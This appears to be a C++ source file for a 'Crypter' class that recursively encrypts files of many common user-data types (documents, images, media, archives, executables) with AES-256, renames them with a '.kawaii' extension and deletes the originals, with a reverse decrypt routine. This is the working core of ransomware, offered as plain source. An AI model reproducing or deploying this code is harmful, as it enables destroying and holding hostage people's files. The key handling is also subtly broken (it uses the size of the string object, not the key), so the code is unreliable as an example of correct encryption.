//
// Created by Romain BAYLE on 01/04/2024.
//

#include "crypter.h"
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "AES_256.hpp"
#include <filesystem>
#include <utility>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <algorithm>

#define BUFFER_SIZE 1024*1024

namespace fs = std::filesystem;

Crypter::Crypter(std::string  directoryPath,std::string key)
        : directoryPath_(std::move(directoryPath)) , key_(std::move(key))// Initialisation du chemin du dossier
{
}
void Crypter::clearMemory(void* ptr, size_t size) {
    // Utilisation de std::fill pour remplir la mémoire avec des zéros
    std::fill(static_cast<unsigned char*>(ptr), static_cast<unsigned char*>(ptr) + size, 0);
}

// Appel de cette méthode après avoir fini d'utiliser la clé
// Par exemple, dans le destructeur de votre classe Crypter

Crypter::~Crypter() {
    // Efface la mémoire utilisée par la clé et le vecteur d'initialisation (iv)
    clearMemory((void*)this->key_.data(), this->key_.size());
    clearMemory((void*)this->iv_.data(), this->iv_.size());
}

bool Crypter::isTargetExtension(const std::string& filePath) {
    std::vector<std::string> targetExtensions = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".exe", ".js", ".php", ".html", ".htm", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".log", ".xml", ".csv", ".dat",".bin"};

    std::string fileExtension = fs::path(filePath).extension().string();
    for (const std::string& ext : targetExtensions) {
        if (fileExtension == ext) {
            return true;
        }
    }
    return false;
}

void Crypter::encrypt() {
     for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
         if (fs::is_regular_file(entry.path())) {
             std::string filePath = entry.path().string();

             if (isTargetExtension(filePath)) {
                 std::string encryptedFilePath = filePath + ".kawaii"; // Ajouter l'extension ".kawaii"

                 std::string content = readFromFile(filePath);
                 std::string encryptedContent = encryptAES(content);
                 writeToFile(encryptedFilePath, encryptedContent);

                 fs::remove(filePath); // Supprimer le fichier original
             }
         }
     }
}

void Crypter::decrypt() {
     for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
         if (fs::is_regular_file(entry.path())) {
             std::string filePath = entry.path().string();
             if (fs::path(filePath).extension() == ".kawaii") { // Vérifier si l'extension est ".kawaii"
                 std::string decryptedFilePath = filePath.substr(0, filePath.size() - 7); // Retirer l'extension ".kawaii"

                 std::string encryptedContent = readFromFile(filePath);
                 std::string decryptedContent = decryptAES(encryptedContent);
                 writeToFile(decryptedFilePath, decryptedContent);

                 fs::remove(filePath); // Supprimer le fichier chiffré

                 // Récupérer l'extension d'origine
                 std::string originalExtension = fs::path(decryptedFilePath).extension().string();
                 // Renommer le fichier déchiffré avec l'extension d'origine
                 fs::rename(decryptedFilePath, decryptedFilePath.substr(0, decryptedFilePath.size()-originalExtension.size()) + originalExtension);
             }
         }
     }
}

std::string Crypter::readFromFile(const std::string &filePath) {
    std::ifstream file(filePath, std::ios::binary);
    std::string content;

    if (file.is_open()) {
        content.assign((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
        file.close();
    } else {
        std::cerr << "Impossible d'ouvrir le fichier : " << filePath << std::endl;
    }

    return content;
}

std::string Crypter::encryptAES(const std::string &input_text) {
    ByteArray key, enc;
    size_t key_len = sizeof(this->key_);

    // Convert key_init to ByteArray
    for (size_t i = 0; i < key_len; ++i)
        key.push_back(this->key_[i]);

    std::stringstream input(input_text);
    std::stringstream output;

    AES_256 aes(key);

    size_t file_len = input_text.size();
   // std::cout << "File is " << file_len << " bytes\n";

    if (file_len > 0) {
        enc.clear();
        aes.encrypt_start(file_len, enc);
        output.write(reinterpret_cast<const char*>(enc.data()), enc.size());

        while (!input.eof()) {
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE);
            buffer_len = input.gcount();

            if (buffer_len > 0) {
                enc.clear();
                aes.encrypt_continue(buffer, buffer_len, enc);
                output.write(reinterpret_cast<const char*>(enc.data()), enc.size());
            }
        }

        enc.clear();
        aes.encrypt_end(enc);
        output.write(reinterpret_cast<const char*>(enc.data()), enc.size());
    }

    return output.str();
    }
std::string Crypter::decryptAES(const std::string &encryptedText) {
    ByteArray key, dec;
    size_t key_len = sizeof(this->key_);

    // Convert key_init to ByteArray
    for (size_t i = 0; i < key_len; ++i)
        key.push_back(this->key_[i]);

    std::stringstream input(encryptedText);
    std::stringstream output;

    AES_256 aes(key);

    size_t file_len = encryptedText.size();
    //std::cout << "File is " << file_len << " bytes\n";

    if (file_len > 0) {
        aes.decrypt_start(file_len);

        while (!input.eof()) {
            unsigned char buffer[BUFFER_SIZE];
            size_t buffer_len;

            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE);
            buffer_len = input.gcount();

            if (buffer_len > 0) {
                dec.clear();
                aes.decrypt_continue(buffer, buffer_len, dec);
                output.write(reinterpret_cast<const char*>(dec.data()), dec.size());
            }
        }

        dec.clear();
        aes.decrypt_end(dec);
        output.write(reinterpret_cast<const char*>(dec.data()), dec.size());
    }

    return output.str();

}

void Crypter::writeToFile(const std::string &filePath, const std::string &content) {
    std::ofstream file(filePath, std::ios::binary);
    if (file.is_open()) {
        file.write(content.c_str(), content.size());
        file.close();
    } else {
        std::cerr << "Impossible d'écrire dans le fichier : " << filePath << std::endl;
    }
}